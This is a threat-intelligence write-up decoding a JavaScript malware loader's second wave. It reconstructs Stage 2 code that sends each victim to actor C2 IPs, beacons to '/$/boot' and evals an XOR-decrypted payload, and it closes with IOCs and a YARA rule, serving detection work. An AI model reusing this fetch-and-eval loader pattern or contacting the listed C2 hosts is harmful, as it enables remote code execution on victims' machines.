# Task B: W2 Stage 1 Decode — `_$_16d1` Cipher + Direct HTTP C2 Discovery

**Date:** 2026-06-28  
**Task:** Decode W2 Stage 1 (`_$_16d1` cipher, activation 8063 / return 8223)  
**Source:** TRON W2 `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` → BSC TX `0x7ffb4e...`

---

## Summary

W2 Stage 1 is structurally similar to W1 but delivers a fundamentally different Stage 2:
instead of the TRON→BSC blockchain dead-drop chain, **W2 Stage 2 makes a direct HTTP beacon**
to actor-controlled infrastructure at `/$/boot`. This reveals a third C2 IP address
(`23.27.13.43`) not documented in any prior analysis, and exposes the actor's victim
segmentation/routing system.

---

## Decryption Chain

```
TRON W2 (TXfxHUet...) → raw_data.data (hex→UTF8→reverse) → BSC TX hash
BSC TX 0x7ffb4e... → input field (hex→UTF8) → split '?.?' → [1] = encrypted payload
XOR decrypt with W2 key "m6:tTh^D)cBz?NM]" → W2 Stage 1 (3,525 chars)
```

The decryption is identical to W1 (TRON→BSC→XOR), confirming a shared Stage 0/Stage 1
delivery architecture across both channels.

---

## `_$_16d1` Cipher — Decoded

The outer cipher `_$_16d1` in W2 Stage 1 encodes only **2 entries**:

| Index | Value | Purpose |
|-------|-------|---------|
| `[0]` | `'function'` | `typeof require === 'function'` type check |
| `[1]` | `'r'` | `global['r'] = require` (store require) |

**Parameters:** seed=1147810, off1=488, mod1=34187, off2=538, mod2=48866, modulus=4728540  
**Encoded string:** `"ou%trinncf"` (10 chars, 1 separator → 2 entries)

The `_$_16d1` cipher's role is purely housekeeping — it stores `require` in `global['r']`
exactly as the Cot wave and `_$_1e42` 2509/1358 cluster do. The routing table is NOT in
`_$_16d1`; it lives inside Stage 2.

---

## W2 Stage 1 IIFE Structure

```javascript
var _$_16d1 = (function(k,a){...cipher...})("ou%trinncf", 1147810);
if (typeof require === _$_16d1[0]) { global[_$_16d1[1]] = require }
// → global['r'] = require

(function(){
  var WUG='', hyB=937-926;   // hyB=11

  function Wrm(a) {           // bootstrap cipher
    seed=2296496, off1=213, mod1=18466, off2=407, mod2=32620, modulus=3485560
  }

  var VkC = Wrm('hmrcqulkvtuatjoocswicsdynongpezfrtxbr').substr(0,11);  // → 'constructor'
  var ptU = '...890-char encoded decompressor...';

  var POz = Wrm[VkC];         // = Function constructor
  var lMN = '';
  var OTJ = POz;
  var uEC = POz(lMN, Wrm(ptU));              // decompressor fn
  var JfM = uEC(Wrm('...1591-char stage2 enc...'));  // Stage 2 body (1,958 chars)
  var WEz = OTJ(WUG, JfM);                   // Function('', Stage2Body)
  WEz(8063); return 8223;
})()
```

**Wrm bootstrap cipher parameters:** seed=2296496, off1=213, mod1=18466, off2=407, mod2=32620,
modulus=3485560 — identical to the W2 Stage 1 cipher described in prior W2 activation analysis.

---

## W2 Stage 2 — Direct HTTP Beacon (NEW ARCHITECTURE)

Stage 2 body is **1,958 chars**, using cipher `_$_a478` (seed=6463369, off1=322, mod1=34733,
off2=594, mod2=52238, modulus=7232110) for its 35-entry string table.

**Critical difference from W1:** W2 Stage 2 does NOT use the TRON→BSC dead-drop chain.
Instead it makes a **direct HTTP GET request to actor C2 infrastructure**.

### Stage 2 Execution Flow

```javascript
(async function(){
  var c = global;
  var r = c['_V'] || 0;   // read campaign ID

  // Route victim to appropriate C2 server based on campaign ID format
  if (r[0] == 'A') {
    c['_H2'] = 'http://23.27.13.43';       // OLD _$_1e42 victims (e.g. 'A8-765')
  } else if (!isNaN(parseInt(r))) {
    c['_H2'] = 'http://198.105.127.210';   // Numeric campaign IDs
  } else {
    c['_H']  = 'http://198.105.127.210';   // New-wave victims (e.g. '5-3-161')
    c['_H2'] = 'http://23.27.202.27:27017';  // MongoDB fallback
  }

  c['_t_1'] = 'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP';           // store W1 TRON wallet
  c['_t_2'] = '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e';

  // Beacon: HTTP GET to C2
  const url = (c['_H'] || c['_H2']) + '/$/boot';
  const response = await fetch_http(url, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...',
      'Sec-V': r   // send campaign ID to C2 server
    }
  });

  // XOR decrypt response with key "ThZG+0jfXE6VAGOJ"
  const stage3 = xor_decrypt(response_body, "ThZG+0jfXE6VAGOJ");
  await eval(stage3);
})()
```

---

## NEW C2 IP: `23.27.13.43`

`_$_a478[3]` = `"http://23.27.13.43"` — a C2 server not documented in any prior analysis.

**Routing assignment:** This IP receives **only old `_$_1e42` batch victims** — those with
campaign IDs starting with `'A'` (e.g., `'A8-765'`). The actor maintains separate
infrastructure for the older victim cohort.

| C2 IP | Port | Role | Campaign routing |
|--------|------|------|------------------|
| `23.27.13.43` | 80 (HTTP) | **NEW** — old `_$_1e42` victim handler | `_V` starts with `'A'` |
| `198.105.127.210` | 80 (HTTP) | Production server | Numeric `_V` OR new-wave `_V` |
| `23.27.202.27` | 27017 | MongoDB backend | Fallback when `_H` set but fails |

The beacon path is `/$/boot` on port 80 HTTP for all routes.

---

## Victim Routing System — Complete Picture

The W2 Stage 2 routing table exposes the actor's victim segmentation across all known
campaign ID formats:

| Campaign ID format | Example | Routing | Server |
|-------------------|---------|---------|--------|
| Starts with `'A'` | `'A8-765'` | `_H2 = 23.27.13.43` | Old victim handler |
| Pure numeric | (unknown) | `_H2 = 198.105.127.210` | Production |
| Mixed (`N-N-NNN`) | `'5-3-161'` | `_H = 198.105.127.210`, `_H2 = 23.27.202.27:27017` | Production + MongoDB fallback |

The `_H || _H2` fallback logic means `_H` is always preferred. New-wave victims (`'5-3-...'`)
always hit `198.105.127.210`. The MongoDB port `23.27.202.27:27017` is only reachable if
the primary HTTP server at `198.105.127.210` is unreachable.

---

## `_$_a478` String Table — Full Decode

35-entry table (`_$_a478` cipher, seed=6463369):

```
[0]:  "_V"                                ← global campaign ID key
[1]:  "A"                                 ← old-victim ID prefix test
[2]:  "_H2"                               ← secondary C2 host global
[3]:  "http://23.27.13.43"               ← NEW C2 IP (old _$_1e42 victims)
[4]:  "parseInt"
[5]:  "isNaN"
[6]:  "http://198.105.127.210"            ← production C2 server
[7]:  "_H"                                ← primary C2 host global
[8]:  "http://23.27.202.27:27017"         ← MongoDB C2 (fallback)
[9]:  "_t_1"                              ← global for W1 TRON wallet
[10]: "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP"  ← TRON W1 (stored in _t_1)
[11]: "_t_2"                              ← global for Aptos fallback
[12]: "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e"  ← Aptos 1
[13]: "/$/boot"                           ← beacon path (Stage 3 fetch)
[14]: "URL"
[15]: "GET"
[16]: "hostname"
[17]: "port"
[18]: "pathname"
[19]: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36"
[20]: ""
[21]: "data"
[22]: "on"
[23]: "end"
[24]: "request"
[25]: "http"
[26]: "r"                                 ← global['r'] = require
[27]: "error"
[28]: "Promise"
[29]: "ThZG+0jfXE6VAGOJ"                 ← Stage 3 XOR decrypt key (NEW)
[30]: "length"
[31]: "call"
[32]: "charCodeAt"
[33]: "fromCharCode"
[34]: "String"
```

---

## W1 vs W2 Architecture Comparison

| | W1 Stage 1 (`_$_9f51`, 5,849b) | W2 Stage 1 (`_$_16d1`, 3,525b) |
|-|-|-|
| Outer cipher entries | 17 (routing table) | **2** (typeof check + require key) |
| Stage 2 fetch method | TRON → BSC dead-drop | **Direct HTTP GET** |
| Stage 2 size | 77,279 chars (compressed RAT) | **1,958 chars** |
| Stage 3 XOR key | `2[gWfGj;<:-93Z^C` | **`ThZG+0jfXE6VAGOJ`** (new) |
| C2 server | blockchain-hosted | **`23.27.13.43` / `198.105.127.210`** |
| Beacon path | N/A | **`/$/boot`** |
| User-Agent | N/A | Chrome 131 spoof |
| Campaign ID in header | N/A | `Sec-V: {campaign_id}` |

W2 is a **lighter, faster** C2 path: 3,525b Stage 1 → 1,958b Stage 2 → direct HTTP Stage 3
fetch. W1 is the **heavier, more evasive** path: 5,849b Stage 1 → 77,279b Stage 2 → full
Beavertail RAT.

The two paths likely serve different operator intents:
- W1 = full persistent implant (Beavertail RAT delivered via blockchain obfuscation)
- W2 = lightweight beacon (quick check-in, Stage 3 fetched directly from actor server)

---

## `Sec-V` Header — Victim Identification

The `"Sec-V": r` header sends the victim's campaign ID to the actor's `/$/boot` endpoint
with every call. The server receives:
- The victim's batch/sequence number (e.g., `"5-3-161"`)
- The W2 XOR key and routing branch are different per batch — so the server can identify
  exactly which infection wave and victim is calling

This is the actor's **active C2 callback** mechanism: each infected machine periodically
(or on build) beacons to `/$/boot` with its ID, and the server responds with a customized
Stage 3 payload.

---

## IOCs (new from Task B)

```
# NEW C2 IP — not in any prior report
23.27.13.43             (W2 Stage 2, old _$_1e42 victim handler, port 80 HTTP)

# Beacon URL (all victim types in W2 chain)
http://23.27.13.43/$/boot      (old _$_1e42 'A...' victims)
http://198.105.127.210/$/boot  (numeric and new-wave victims)

# NEW XOR key for W2 Stage 3
"ThZG+0jfXE6VAGOJ"

# W2 Stage 2 cipher parameters
Cipher: _$_a478
Seed: 6463369
Offsets: 322 / 594
Mods: 34733 / 52238
Modulus: 7232110

# _$_16d1 cipher parameters (outer W2 Stage 1)
Seed: 1147810
Offsets: 488 / 538
Mods: 34187 / 48866
Modulus: 4728540
Encoded: "ou%trinncf" → ['function', 'r']

# Wrm bootstrap cipher (W2 Stage 1 inner)
Seed: 2296496
Offsets: 213 / 407
Mods: 18466 / 32620
Modulus: 3485560

# HTTP detection rules (network)
GET /$/boot HTTP/1.1 with header "Sec-V: <campaign_id>"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36

# YARA (host/network)
rule PolinRider_W2_Boot_Beacon {
    strings:
        $path  = "/$/boot" ascii
        $secv  = "Sec-V" ascii
        $key   = "ThZG+0jfXE6VAGOJ" ascii
        $ip1   = "23.27.13.43" ascii
    condition:
        2 of them
}
```
